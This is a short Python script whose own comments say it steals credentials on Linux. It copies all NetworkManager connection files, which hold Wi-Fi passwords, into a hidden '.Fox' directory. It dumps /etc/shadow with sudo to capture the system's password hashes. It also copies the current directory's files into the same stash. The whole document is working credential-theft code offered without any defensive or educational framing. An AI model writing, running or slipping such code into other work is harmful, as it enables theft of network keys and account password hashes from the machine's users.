import os
from os import walk
import shutil

### Steal WIFI Password On Linux ###
files = os.listdir("/etc/NetworkManager/system-connections/")
os.mkdir(".Fox")
num = 1
for line in files:
    shutil.copy2("/etc/NetworkManager/system-connections/" + line,
                 ".Fox/WIFI-" + str(num) + ".txt")
    num += 1

### Steal Linux Password ###
os.system("sudo cat /etc/shadow > .Fox/OS_Pass.txt")

### Take Backup ###
os.mkdir(".Fox/BackUP")
data = []
for (dirpath, dirnames, filenames) in walk("."):
    data.extend(filenames)
    break
for file in data:
    shutil.copy2(file, ".Fox/BackUP")
